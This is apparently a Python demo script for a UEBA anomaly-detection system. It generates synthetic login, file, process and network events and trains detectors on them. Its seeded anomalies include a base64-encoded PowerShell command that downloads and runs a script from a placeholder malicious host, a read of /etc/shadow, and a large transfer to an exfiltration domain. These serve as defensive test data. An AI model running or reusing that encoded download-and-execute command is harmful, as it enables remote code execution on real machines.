"""
UEBA (User and Entity Behavior Analytics) Demo

This script demonstrates how to use the UEBA system to detect anomalous behavior.
"""
import os
import sys
import yaml
import logging
import json
from datetime import datetime, timedelta
import random
from pathlib import Path

# Add the project root to the Python path
project_root = str(Path(__file__).parent.parent)
if project_root not in sys.path:
    sys.path.insert(0, project_root)

from siem.ueba.detectors import UEBAWithDetectors

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('ueba_demo.log')
    ]
)
logger = logging.getLogger("ueba_demo")

def load_config() -> dict:
    """Load the UEBA configuration."""
    config_path = os.path.join(project_root, 'config', 'ueba_config.yaml')
    try:
        with open(config_path, 'r') as f:
            return yaml.safe_load(f)
    except Exception as e:
        logger.error(f"Error loading configuration: {e}")
        raise

def generate_sample_events(count: int = 100) -> list:
    """Generate sample events for demonstration purposes."""
    users = ['alice', 'bob', 'charlie', 'dave', 'eve']
    source_ips = ['10.0.0.' + str(i) for i in range(1, 11)]
    dest_ips = ['192.168.1.' + str(i) for i in range(1, 6)]
    domains = ['example.com', 'internal.corp', 'api.service.com', 'fileserver.local']
    
    events = []
    base_time = datetime.utcnow()
    
    for i in range(count):
        # Vary the timestamp slightly
        event_time = base_time - timedelta(minutes=random.randint(0, 60))
        
        # Randomly select a user
        user = random.choice(users)
        
        # Randomly determine the event type
        event_type = random.choices(
            ['authentication', 'file_access', 'process', 'network'],
            weights=[0.3, 0.2, 0.2, 0.3],
            k=1
        )[0]
        
        # Create a base event
        event = {
            '@timestamp': event_time.isoformat() + 'Z',
            'event': {
                'kind': 'event',
                'category': [event_type],
                'type': [event_type],
                'outcome': 'success' if random.random() > 0.1 else 'failure'
            },
            'user': {
                'name': user,
                'domain': 'CORP'
            },
            'source': {
                'ip': random.choice(source_ips),
                'port': random.randint(1024, 65535)
            },
            'destination': {
                'ip': random.choice(dest_ips),
                'port': random.choice([80, 443, 22, 3389, 3306])
            },
            'network': {
                'protocol': random.choice(['tcp', 'udp']),
                'bytes': random.randint(100, 1048576)  # 100B to 1MB
            }
        }
        
        # Add type-specific fields
        if event_type == 'authentication':
            event['event']['action'] = 'user_login'
            event['source'].pop('port', None)
            event['destination'].pop('port', None)
            
        elif event_type == 'file_access':
            event['file'] = {
                'path': f'/home/{user}/documents/file_{random.randint(1, 100)}.txt',
                'size': random.randint(1024, 10485760),  # 1KB to 10MB
                'extension': random.choice(['.txt', '.docx', '.xlsx', '.pdf', '.jpg'])
            }
            
        elif event_type == 'process':
            event['process'] = {
                'name': random.choice(['chrome.exe', 'explorer.exe', 'powershell.exe', 'cmd.exe']),
                'pid': random.randint(1000, 9999),
                'command_line': f"{random.choice(['runas', 'sudo', 'powershell'])} {random.choice(['-Command', '-File'])} script.ps1"
            }
            
        elif event_type == 'network':
            event['destination']['domain'] = random.choice(domains)
            if random.random() < 0.1:  # 10% chance of being external
                event['destination']['ip'] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        
        # Add some anomalies for demonstration
        if random.random() < 0.05:  # 5% chance of being anomalous
            if event_type == 'authentication':
                event['event']['outcome'] = 'failure'
                event['source']['ip'] = '192.168.1.100'  # Suspicious IP
                
            elif event_type == 'file_access':
                event['file']['path'] = '/etc/shadow'  # Sensitive file
                
            elif event_type == 'process':
                event['process']['command_line'] = 'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHMAYwByAGkAcAB0AC4AcABzADEAJwApAA=='  # Base64 encoded malicious command
                
            elif event_type == 'network':
                event['destination']['domain'] = 'exfiltrate.example.com'
                event['network']['bytes'] = random.randint(10485760, 1073741824)  # 10MB to 1GB
        
        events.append(event)
    
    return events

def main():
    """Main function to demonstrate UEBA functionality."""
    try:
        logger.info("Starting UEBA Demo")
        
        # Load configuration
        logger.info("Loading configuration...")
        config = load_config()
        
        # Initialize the UEBA engine
        logger.info("Initializing UEBA engine...")
        ueba_engine = UEBAWithDetectors(config)
        
        # Generate sample events
        logger.info("Generating sample events...")
        events = generate_sample_events(1000)
        logger.info(f"Generated {len(events)} sample events")
        
        # Train the models (in a real scenario, you'd use historical data)
        logger.info("Training models...")
        training_results = ueba_engine.train_models(events[:800])  # Use 80% for training
        logger.info(f"Training complete. Results: {json.dumps(training_results, indent=2)}")
        
        # Save the trained models
        logger.info("Saving models...")
        saved_paths = ueba_engine.save_models()
        logger.info(f"Models saved to: {json.dumps(saved_paths, indent=2)}")
        
        # Process the remaining events for anomaly detection
        logger.info("Processing events for anomaly detection...")
        test_events = events[800:]  # Use 20% for testing
        results = ueba_engine.process_events(test_events)
        
        # Filter and log anomalies
        anomalies = [r for r in results if r.get('is_anomaly', False)]
        logger.info(f"Detected {len(anomalies)} anomalies out of {len(test_events)} events")
        
        # Log some example anomalies
        for i, anomaly in enumerate(anomalies[:5]):  # Show first 5 anomalies
            logger.info(f"Anomaly {i+1} (score: {anomaly.get('score', 0):.2f}): {json.dumps(anomaly, indent=2)}")
        
        logger.info("UEBA Demo completed successfully")
        
    except Exception as e:
        logger.error(f"Error in UEBA demo: {e}", exc_info=True)
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
